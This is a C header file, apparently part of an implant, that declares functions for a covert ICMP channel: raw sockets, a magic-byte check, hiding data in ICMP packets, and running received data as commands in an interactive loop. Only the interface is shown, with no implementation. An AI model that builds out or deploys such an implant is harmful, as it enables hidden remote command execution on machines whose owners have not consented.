#ifndef implant_H
#define implant_H

//#include <linux/icmp.h>
//#include <stdint.h>
#include <netinet/ip_icmp.h>
#define BUFFER_SIZE 1024

void implant_init_n_call(char *dest_ip);
int read_from_socket(int sockfd, char *buffer,int size);
int create_socket(void);
int check_magic_byte(struct icmphdr *icmp);
char *invoke_command(char *data);
void interact(int sockfd, char *dest_ip);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
char *parse_data_section(char *packet);
void prep_icmp_headers(struct icmphdr *icmp, char *data, uint16_t checksum);
void append_to_data_section(struct icmphdr *icmp, char *data, char *input);

#endif